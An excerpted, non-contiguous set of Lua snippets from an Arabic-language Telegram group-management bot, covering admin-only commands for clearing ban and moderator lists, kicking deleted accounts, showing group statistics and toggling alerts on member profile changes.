local faeder = '❀ اهلا عزيزي  '..renk_faeder(msg)..' \n❀ تم حذف كليشه الايدي العامه ،'
faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md')
...
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '❀ هذه الخاصيه للمنشئ والرتب الاعلي منه ، ', 1, 'md')
else
faederdx1:del(FAEDER..'bot:banned:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:momod:'..msg.chat_id_)
faederdx1:del(FAEDER..'bot:donky:'..msg.chat_id_)
...
--     By Developer Faeder     -- 
if text and text:match("^مسح المحذوفين$") and faeder11(msg) or text and text:match("^طرد المحذوفين$") and faeder11(msg) then
...
getChannelMembers(msg.chat_id_, 0, 'Kicked', 1000, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end 
--     By Developer Faeder     -- 
...
faederdx1:set(FAEDER.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@SOPOWERB0T")) 
faederdx(msg.chat_id_, msg.id_, 1, "❀ المنشئ ⌯» ["..monsh.."]\n\n❀ الرابط ، ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/SOPOWERB0T")..")\n❀ ايديها ⌯» *"..msg.chat_id_.."*\n❀ عدد الاعضاء ⌯» *"..data.member_count_.."* \n❀ عدد المدراء ⌯» *"..Owner.."*\n❀ عدد المنشئين ⌯» *"..Monsh.."*\n❀ عدد الادمنيه ⌯» *"..Momod.."*\n❀ عدد المكتومين ⌯» *"..Muted.."*\n❀ عدد المحظورين ⌯» *"..Baned.."*\n❀ عدد المقيدين ⌯» *"..Tkeed.."*\n❀ عدد المميزين ⌯» *"..Vip.."*\n", 1,"md")
end
tdcli_function ({
ID = "GetChannelFull",
...
local  faeder = '❀ تم تفعيل التنبيه علي تغيير\n❀ { صوره - اسم - معرف } الاعضاء\n❀ في كل مجموعات البوت' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
...
faeder = '❀ تم تعطيل التنبيه علي تغيير\n❀ { صوره - اسم - معرف } الاعضاء\n❀ في كل مجموعات البوت' 
faederdx( msg.chat_id_, msg.id_, 1, faeder, 1, "md") 
...
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم تعطيل التنبيه علي تغيير\n❀ { صوره - اسم - معرف } الاعضاء\n❀ في هذه المجموعه  ', 1, 'md')
...
faederdx(msg.chat_id_, msg.id_, 1, '❀ تم ارسال نسخه الملف الي خاصك مع البوت ', 1, 'md')
end end end
--     By Developer Faeder     -- 
...
local list = faederdx1:smembers(FAEDER.."bot:groups")
local text = "~ Groups_Bots_In_the_Bot_Of_Source_TARA ~ @SOPOWERB0T\n\n"
for k,v in pairs(list) do
...
faederdx(msg.chat_id_, msg.id_, 1, "❀ حسننا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ then
local content_text = faederdx1:get(FAEDER..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
...
--     By Developer Faeder     -- 
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "الردود العامه" and is_sudo(msg) then
...
--     By Developer Faeder     -- 
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "مسح الردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = faederdx1:smembers(FAEDER.."rep_sudo")
if #redod == 0 then
faederdx(msg.chat_id_, msg.id_, 1, "❀ لا توجد ردود مضافه" ,  1, "md")
else
...
❀ اليك اوامر البوت ↓↓
         •┉ • ┉ • ┉ Ͳλℜλ ┉ • ┉ • ┉•
❀ ارسل (م1) لعرض اوامر الحمايه
❀ ارسل (م2) لعرض اوامر المشرفين
❀ ارسل (م3) لعرض اوامر الخدمه
